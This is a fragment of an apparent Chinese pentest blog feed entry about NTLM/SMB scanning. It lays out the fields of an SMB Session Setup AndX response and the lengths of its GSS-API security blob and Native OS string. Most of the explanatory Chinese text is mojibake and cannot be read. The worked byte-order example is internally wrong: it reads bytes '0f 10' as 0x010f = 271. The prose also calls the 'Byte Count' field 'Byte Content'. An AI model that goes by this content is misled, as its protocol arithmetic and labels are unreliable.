&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;SMB Header:  32 byte
Word Count:  1 byte
AndXCommand: 1 byte
Reserved:    1 byte
AndXOffset:  2 byte
Action: 	   2 byte
Security Blob Length: 2 byte (è¡¨ç¤ºSecurity Blobçš„é•¿åº¦ï¼Œè¿™é‡Œçš„hexæ˜¯ 0f 10ï¼Œå°ç«¯è½¬æ¢ä¸º010f,å†è½¬æ¢æˆ10è¿›åˆ¶å°±æ˜¯271ï¼Œå¯¹åº”Security Blobçš„é•¿åº¦)
Byte Count: 2 byte (è¡¨ç¤ºSecurity BlobåŠ ä¸ŠNativeOSå’ŒNative Lançš„é•¿åº¦)
Security Blob: å¯å˜é•¿åº¦ï¼Œå–å†³äºSecurity Blob Length&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸Šé¢çš„æ•°æ®åŒ…ç»“æ„çš„å…³é”®æ•°æ®æ˜¯&lt;code&gt;Security Blob Length&lt;/code&gt;å’Œ&lt;code&gt;Byte Content&lt;/code&gt;ï¼Œå‰è€…è¡¨ç¤ºGSS-APIçš„æ•´ä¸ªæ•°æ®åŒ…é•¿åº¦ï¼Œåè€…è¡¨ç¤ºGSS-APIå’ŒNative OSåŠ ä¸ŠNative LMçš„æ•°æ®é•¿åº¦ï¼š&lt;/p&gt;
&lt;h6 id=&quot;GSS-APIçš„é•¿åº¦æ˜¯271-Byte&quot;&gt;&lt;a href=&quot;#GSS-APIçš„é•¿åº¦æ˜¯271-Byte&quot; class=&quot;headerlink&quot; title=&quot;GSS-APIçš„é•¿åº¦æ˜¯271 Byte&quot;&gt;&lt;/a&gt;GSS-APIçš„é•¿åº¦æ˜¯271 Byte&lt;/h6&gt;&lt;p&gt;&lt;img src=&quot;/2021/08/06/windows-ntlm-smb-scan/ntlm-3.png&quot;&gt;&lt;/p&gt;
&lt;h6 id=&quot;Native-OSçš„é•¿åº¦æ˜¯42-Byte&quot;&gt;&lt;a href=&quot;#Native-OSçš„é•¿åº¦æ˜¯42-Byte&quot; class=&quot;headerlink&quot; title=&quot;Native OSçš„é•¿åº¦æ˜¯42 Byte&quot;&gt;&lt;/a&gt;Native OSçš„é•¿åº¦æ˜¯42 Byte&lt;/h6&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
</feed>
